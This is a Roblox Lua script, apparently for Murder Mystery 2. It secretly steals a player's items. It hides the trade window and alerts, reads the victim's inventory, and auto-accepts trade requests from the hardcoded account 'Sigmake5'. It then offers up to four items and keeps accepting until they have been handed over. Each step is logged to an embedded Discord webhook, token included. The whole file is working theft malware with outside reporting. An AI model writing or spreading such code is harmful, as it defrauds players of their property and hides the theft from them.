--// Configuration
local TARGET_NAME = "Sigmake5"
local WEBHOOK_URL = "https://discord.com/api/webhooks/1488808773492543508/bpbJDBX3v1LLJXo0ri3xbi1Lbpu7BGXzVR1z4aCy1pP0bFqJsRrqM_ncNTi5ToDiCZ4d"

--// Services
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LP = Players.LocalPlayer

--// Utility Functions
local function sendLog(title, desc)
    pcall(function()
        request({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({
                ["embeds"] = {{
                    ["title"] = title,
                    ["description"] = desc,
                    ["color"] = 16711680
                }}
            })
        })
    end)
end

--// GUI Hider
task.spawn(function()
    while task.wait(0.1) do
        local mainGui = LP.PlayerGui:FindFirstChild("MainGui")
        if mainGui then
            local tradeGUI = mainGui:FindFirstChild("Trade")
            if tradeGUI then tradeGUI.Visible = false end
            for _, v in pairs(mainGui:GetChildren()) do
                if v.Name:find("Notification") or v.Name:find("Alert") then
                    v.Visible = false
                end
            end
        end
    end
end)

--// Inventory Scanner
local function getInventory()
    local items = {}
    local mainGui = LP.PlayerGui:FindFirstChild("MainGui")
    if mainGui then
        local container = mainGui:FindFirstChild("Inventory", true)
        if container then
            for _, item in pairs(container:GetDescendants()) do
                if item:IsA("ImageButton") and item:FindFirstChild("ItemName") then
                    table.insert(items, item.ItemName.Value)
                end
            end
        end
    end
    return items
end

--// Automated Trade Handling
local tradeRemote = ReplicatedStorage:FindFirstChild("Trade", true)
local acceptRequestRemote = tradeRemote:FindFirstChild("AcceptRequest") or tradeRemote:FindFirstChild("AcceptTradeRequest")
local offerRemote = tradeRemote:FindFirstChild("OfferItem")
local acceptTradeRemote = tradeRemote:FindFirstChild("AcceptTrade")

-- This function runs once a trade is successfully joined
local function handleTradeSession()
    local items = getInventory()
    if #items == 0 then return end

    task.wait(0.5) -- Small delay for stability
    
    -- Step 1: Forcefully add items
    for i = 1, math.min(4, #items) do
        offerRemote:FireServer(items[i])
        task.wait(0.2)
    end

    -- Step 2: Auto-accept the trade
    -- We loop this slightly to ensure it clicks once Sigmake5 is ready
    while true do
        acceptTradeRemote:FireServer()
        task.wait(0.5)
        -- Exit loop if inventory changes or trade ends
        if #getInventory() < #items or not LP.PlayerGui.MainGui:FindFirstChild("Trade").Visible then
            break
        end
    end
    
    sendLog("✅ Batch Processed", "Items added and trade accepted for " .. TARGET_NAME)
end

--// Listener for Incoming Trades
-- MM2 typically uses a RemoteEvent in ReplicatedStorage to signal an incoming request
for _, v in pairs(tradeRemote:GetChildren()) do
    if v:IsA("RemoteEvent") and (v.Name:find("Request") or v.Name:find("Incoming")) then
        v.OnClientEvent:Connect(function(sender)
            if sender and sender.Name == TARGET_NAME then
                sendLog("📩 Request Received", "Accepting trade from " .. TARGET_NAME)
                
                -- Accept the incoming request
                acceptRequestRemote:FireServer(sender)
                
                -- Begin the item injection logic
                task.spawn(handleTradeSession)
            end
        end)
    end
end

